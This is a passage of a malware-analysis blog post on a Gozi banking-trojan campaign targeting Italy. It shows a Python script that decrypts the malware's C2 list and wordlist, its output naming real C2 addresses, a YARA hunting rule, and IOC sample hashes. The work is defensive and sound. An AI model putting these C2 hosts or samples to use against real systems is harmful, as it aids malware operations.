+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">entry</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="n">entry_data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">entry</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ISO-8859-1'</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">entry_data</span>
+
+<span class="k">def</span> <span class="nf">decodeC2</span><span class="p">(</span><span class="n">dataArray</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">data</span> <span class="ow">in</span> <span class="n">dataArray</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">data</span><span class="p">.</span><span class="n">isascii</span><span class="p">()</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">20</span><span class="p">:</span>
+            <span class="n">c2List</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)</span>
+            <span class="k">for</span> <span class="n">c2</span> <span class="ow">in</span> <span class="n">c2List</span><span class="p">:</span>
+            	<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">[+] </span><span class="si">{</span><span class="n">c2</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+
+<span class="n">dataStructs</span> <span class="o">=</span> <span class="n">locate_structs</span><span class="p">()</span>
+
+<span class="k">for</span> <span class="n">data</span> <span class="ow">in</span> <span class="n">dataStructs</span><span class="p">:</span>
+    <span class="n">crcHash</span> <span class="o">=</span> <span class="n">convertEndian</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">10</span><span class="p">])</span>
+    <span class="k">if</span> <span class="n">crcHash</span> <span class="o">==</span> <span class="s">'e1285e64'</span><span class="p">:</span> <span class="c1">#RSA Key Hash
+</span>        <span class="n">blobOffset</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">convertEndian</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">10</span><span class="p">:</span><span class="mi">14</span><span class="p">]),</span> <span class="mi">16</span><span class="p">)</span>
+        <span class="n">configOff</span> <span class="o">=</span> <span class="n">pe</span><span class="p">.</span><span class="n">get_offset_from_rva</span><span class="p">(</span><span class="n">blobOffset</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[*] RSA Key at offset:</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">configOff</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">crcHash</span> <span class="o">==</span> <span class="s">'8fb1dde1'</span><span class="p">:</span> <span class="c1">#Config Hash
+</span>        <span class="n">blobOffset</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">convertEndian</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">10</span><span class="p">:</span><span class="mi">14</span><span class="p">]),</span> <span class="mi">16</span><span class="p">)</span>
+        <span class="n">blobLength</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">convertEndian</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">18</span><span class="p">]),</span> <span class="mi">16</span><span class="p">)</span>
+        <span class="n">blobData</span> <span class="o">=</span> <span class="n">blobDataRetrieve</span><span class="p">(</span><span class="n">blobOffset</span><span class="p">,</span> <span class="n">blobLength</span><span class="p">)</span>
+        <span class="n">decryptedData</span> <span class="o">=</span> <span class="n">aplibDecryption</span><span class="p">(</span><span class="n">blobData</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'[*] C2 List:'</span><span class="p">)</span>
+        <span class="n">decodeC2</span><span class="p">(</span><span class="n">decryptedData</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">crcHash</span> <span class="o">==</span> <span class="s">'68ebb983'</span><span class="p">:</span> <span class="c1">#Wordlist Hash
+</span>        <span class="n">blobOffset</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">convertEndian</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">10</span><span class="p">:</span><span class="mi">14</span><span class="p">]),</span> <span class="mi">16</span><span class="p">)</span>
+        <span class="n">blobLength</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">convertEndian</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">18</span><span class="p">]),</span> <span class="mi">16</span><span class="p">)</span>
+        <span class="n">blobData</span> <span class="o">=</span> <span class="n">blobDataRetrieve</span><span class="p">(</span><span class="n">blobOffset</span><span class="p">,</span> <span class="n">blobLength</span><span class="p">)</span>
+        <span class="n">decryptedData</span> <span class="o">=</span> <span class="n">aplibDecryption</span><span class="p">(</span><span class="n">blobData</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'[*] Wordlist:'</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">decryptedData</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">[+] </span><span class="si">{</span><span class="n">word</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] RSA Key at offset:0xa800
+[*] C2 List:
+	[+] checklist.skype.com
+	[+] 62.173.141.252
+	[+] 31.41.44.33
+	[+] 109.248.11.112
+[*] Wordlist:
+	[+] list
+	[+] stop
+	[+] computer
+	[+] desktop
+	[+] system
+	[+] service
+	[+] start
+	[+] game
+	[+] stop
+	[+] operation
+	[+] black
+	[+] line
+	[+] white
+	[+] mode
+	[+] link
+	[+] urls
+	[+] text
+	[+] name
+	[+] document
+	[+] type
+	[+] folder
+	[+] mouse
+	[+] file
+	[+] paper
+	[+] mark
+	[+] check
+	[+] mask
+	[+] level
+	[+] memory
+	[+] chip
+	[+] time
+	[+] reply
+	[+] date
+	[+] mirrow
+	[+] settings
+	[+] collect
+	[+] options
+	[+] value
+	[+] manager
+	[+] page
+	[+] control
+	[+] thread
+	[+] operator
+	[+] byte
+	[+] char
+	[+] return
+	[+] device
+	[+] driver
+	[+] tool
+	[+] sheet
+	[+] util
+	[+] book
+	[+] class
+	[+] window
+	[+] handler
+	[+] pack
+	[+] virtual
+	[+] test
+	[+] active
+	[+] collision
+	[+] process
+	[+] make
+	[+] local
+	[+] core
+</code></pre></div></div>
+
+<h1 id="yara-rule">Yara Rule</h1>
+<p>The below rule was created to hunt down unpacked binaries:</p>
+<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">import</span> <span class="s">"pe"</span>
+<span class="n">rule</span> <span class="n">Win_Gozi_JJ</span> <span class="p">{</span>
+    <span class="n">meta</span><span class="p">:</span>
+		<span class="n">description</span> <span class="o">=</span> <span class="s">"Gozi JJ Structure binary rule"</span>
+		<span class="n">author</span> <span class="o">=</span> <span class="s">"Igal Lytzki"</span>
+		<span class="n">malware_family</span> <span class="o">=</span> <span class="s">"Gozi"</span>
+		<span class="n">date</span> <span class="o">=</span> <span class="s">"15-03-23"</span>
+		
+    <span class="n">strings</span><span class="p">:</span>
+        <span class="err">$</span><span class="n">fingerprint</span> <span class="o">=</span> <span class="s">"JJ"</span> <span class="n">ascii</span>
+        <span class="err">$</span><span class="n">peCheck</span> <span class="o">=</span> <span class="s">"This program cannot be run in DOS mode"</span> <span class="n">ascii</span>
+    <span class="n">condition</span><span class="p">:</span>
+		<span class="n">all</span> <span class="n">of</span> <span class="n">them</span> <span class="n">and</span> <span class="p">#</span><span class="n">fingerprint</span> <span class="o">&gt;=</span> <span class="mi">2</span> <span class="n">and</span> <span class="n">for</span> <span class="n">all</span> <span class="n">i</span> <span class="n">in</span> <span class="p">(</span><span class="mf">1.</span><span class="p">.</span><span class="err">#</span><span class="n">fingerprint</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span> <span class="p">(</span><span class="err">@</span><span class="n">fingerprint</span><span class="err">[</span><span class="n">i</span><span class="err">]</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="n">x400</span> <span class="n">and</span> <span class="err">@</span><span class="n">fingerprint</span><span class="err">[</span><span class="n">i</span><span class="err">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="n">x250</span> <span class="n">and</span> <span class="err">@</span><span class="n">fingerprint</span><span class="err">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="err">]</span> <span class="o">-</span> <span class="err">@</span><span class="n">fingerprint</span><span class="err">[</span><span class="n">i</span><span class="err">]</span> <span class="o">==</span> <span class="mi">0</span><span class="n">x14</span><span class="p">)</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>You can see the result of proactive hunt using <a href="https://www.unpac.me/yara/results/9fbb4b2c-ecaf-40bc-bf8f-6c8162189021">unpac.me</a> yara hunt</p>
+
+<h1 id="summary">Summary</h1>
+<p>In this blogpost we went over a recent Gozi distribution campaign that was targeting the Italian audience.<br />The developers added some extra layers of protection to insure the payloads are being opened by Italian only users and by this bypass AV’s to identify the retrieved payload.</p>
+
+<h1 id="iocs">IOC’s</h1>
+<ul>
+  <li><strong>Samples:</strong>
+    <ul>
+      <li>AgenziaEntrate.hta - <a href="https://bazaar.abuse.ch/sample/a3cec099b936e9f486de3b1492a81e55b17d5c2b06223f4256d49afc7bd212bc">a3cec099b936e9f486de3b1492a81e55b17d5c2b06223f4256d49afc7bd212bc</a></li>
+      <li>AgenziaEntrate_decoded.js - <a href="https://bazaar.abuse.ch/sample/c99f4de75e3c6fe98d6fbbcd0a7dbf45e8c7539ec8dc77ce86cea2cfaf822b6a/">c99f4de75e3c6fe98d6fbbcd0a7dbf45e8c7539ec8dc77ce86cea2cfaf822b6a</a></li>
+      <li>installazione.exe - <a href="https://bazaar.abuse.ch/sample/9d1e71b94eab825c928377e93377feb62e02a85b7d750b883919207119a56e0d/">9d1e71b94eab825c928377e93377feb62e02a85b7d750b883919207119a56e0d</a></li>
+      <li>shellcode1.bin - <a href="https://bazaar.abuse.ch/sample/ebea18a2f0840080d033fb9eb3c54a91eb73f0138893e6c29eb7882bf74c1c30/">ebea18a2f0840080d033fb9eb3c54a91eb73f0138893e6c29eb7882bf74c1c30</a></li>
+      <li>shellcode2.bin - <a href="https://bazaar.abuse.ch/sample/df4f432719d32be6cc61598e9ca9a982dc0b6f093f8314c8557457729df3b37f/">df4f432719d32be6cc61598e9ca9a982dc0b6f093f8314c8557457729df3b37f</a></li>
+      <li>gozi loader.bin - <a href="https://bazaar.abuse.ch/sample/061c271c0617e56aeb196c834fcab2d24755afa50cd95cc6a299d76be496a858/">061c271c0617e56aeb196c834fcab2d24755afa50cd95cc6a299d76be496a858</a></li>
+      <li>gozi binary.bin - <a href="https://bazaar.abuse.ch/sample/876860a923754e2d2f6b1514d98f4914271e8cf60d3f95cf1f983e91baffa32b">876860a923754e2d2f6b1514d98f4914271e8cf60d3f95cf1f983e91baffa32b</a></li>
+    </ul>
+  </li>
+  <li><strong>C2’s:</strong>
+    <ul>
+      <li>62.173.141.252</li>
+      <li>31.41.44.33</li>
+      <li>109.248.11.112</li>
+    </ul>
+  </li>
+</ul>
+
+<h1 id="references">References</h1>
+<ul>
+  <li><a href="https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/space-pirates-tools-and-connections/">Kernel32.dll hash resolve</a></li>
+  <li><a href="https://github.com/mandiant/capa-rules/issues/175">Imports hashes resolve</a></li>
+  <li><a href="https://unprotect.it/technique/apc-injection/">Unprotect.it APC Injection</a></li>
+  <li><a href="https://cert-agid.gov.it/news/yau-parte-8-il-secondo-stadio-configurazione-e-download/">Gozi crc hash resolve</a></li>
+  <li><a href="https://research.openanalysis.net/config/python/yara/isfb/rm3/gozi/2022/10/06/isfb.html">OaLabs Gozi notes</a></li>
+</ul>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#config-extraction" class="page__taxonomy-item" rel="tag">Config Extraction</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#gozi" class="page__taxonomy-item" rel="tag">Gozi</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ida" class="page__taxonomy-item" rel="tag">IDA</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#injection" class="page__taxonomy-item" rel="tag">Injection</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#jscript" class="page__taxonomy-item" rel="tag">Jscript</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#shellcode" class="page__taxonomy-item" rel="tag">ShellCode</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#yara" class="page__taxonomy-item" rel="tag">Yara</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#threat-breakdown" class="page__taxonomy-item" rel="tag">Threat Breakdown</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-03-19T00:00:00+00:00">March 19, 2023</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=Gozi+-+Italian+ShellCode+Dance%20https%3A%2F%2F0xtoxin.github.io%2Fthreat%2520breakdown%2FGozi-Italy-Campaign%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2F0xtoxin.github.io%2Fthreat%2520breakdown%2FGozi-Italy-Campaign%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2F0xtoxin.github.io%2Fthreat%2520breakdown%2FGozi-Italy-Campaign%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/malware%20analysis/Bumblebee-DocuSign-Campaign/" class="pagination--pager" title="BumbleBee DocuSign Campaign
+">Previous</a>
+    
+    
+      <a href="/threat%20breakdown/ScrubCrypt-Rebirth-Of-Jlaive/" class="pagination--pager" title="ScrubCrypt - The Rebirth of Jlaive
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2023 0xToxin. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
